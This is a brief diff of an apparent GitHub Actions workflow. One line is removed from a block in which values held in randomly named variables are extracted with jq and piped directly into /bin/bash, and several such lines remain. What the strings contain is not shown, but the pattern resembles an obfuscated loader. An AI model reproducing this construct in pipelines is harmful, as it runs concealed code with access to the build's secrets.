@@ -21,7 +21,6 @@ jobs:
           echo $nsf25 | jq -r .j8146 | /bin/bash
           echo $v7941 | jq -r .gyx68 | /bin/bash
           printf '%s' "$pa215" | jq -r .qjvxw563 | /bin/bash
-          printf '%s' "$sbo87" | jq -r .o4 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
